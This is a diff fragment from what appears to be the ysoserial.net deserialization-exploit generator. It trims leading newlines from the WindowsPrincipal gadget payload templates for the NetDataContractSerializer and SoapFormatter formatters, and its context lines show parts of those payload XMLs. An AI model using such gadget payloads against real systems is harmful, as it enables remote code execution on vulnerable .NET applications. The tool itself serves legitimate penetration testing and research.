@@ -151,8 +151,7 @@ namespace ysoserial.Generators
             else if (formatter.ToLower().Equals("netdatacontractserializer"))
             {
 
-                string payload = $@"
-<WindowsPrincipal z:Type=""System.Security.Principal.WindowsPrincipal"" z:Assembly=""mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"" xmlns=""http://schemas.datacontract.org/2004/07/System.Security.Principal"" xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:z=""http://schemas.microsoft.com/2003/10/Serialization/"" >
+                string payload = $@"<WindowsPrincipal z:Type=""System.Security.Principal.WindowsPrincipal"" z:Assembly=""mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"" xmlns=""http://schemas.datacontract.org/2004/07/System.Security.Principal"" xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:z=""http://schemas.microsoft.com/2003/10/Serialization/"" >
     <m_identity z:Type=""System.Security.Principal.WindowsIdentity"" z:Assembly=""mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"" >
         <System.Security.ClaimsIdentity.actor z:Type=""System.String"" z:Assembly=""0"" xmlns="""">
             {b64encoded}
@@ -207,8 +206,7 @@ namespace ysoserial.Generators
             }
             else if (formatter.ToLower().Equals("soapformatter"))
             {
-                string payload = $@"
-<SOAP-ENV:Envelope xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns:SOAP-ENC= ""http://schemas.xmlsoap.org/soap/encoding/"" xmlns:SOAP-ENV=""http://schemas.xmlsoap.org/soap/envelope/"" xmlns:clr=""http://schemas.microsoft.com/soap/encoding/clr/1.0"" SOAP-ENV:encodingStyle=""http://schemas.xmlsoap.org/soap/encoding/"">
+                string payload = $@"<SOAP-ENV:Envelope xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns:SOAP-ENC= ""http://schemas.xmlsoap.org/soap/encoding/"" xmlns:SOAP-ENV=""http://schemas.xmlsoap.org/soap/envelope/"" xmlns:clr=""http://schemas.microsoft.com/soap/encoding/clr/1.0"" SOAP-ENV:encodingStyle=""http://schemas.xmlsoap.org/soap/encoding/"">
     <SOAP-ENV:Body>
         <a1:WindowsPrincipal xmlns:a1=""http://schemas.microsoft.com/clr/ns/System.Security.Principal"">
             <m_identity href = ""#ref-2"" />
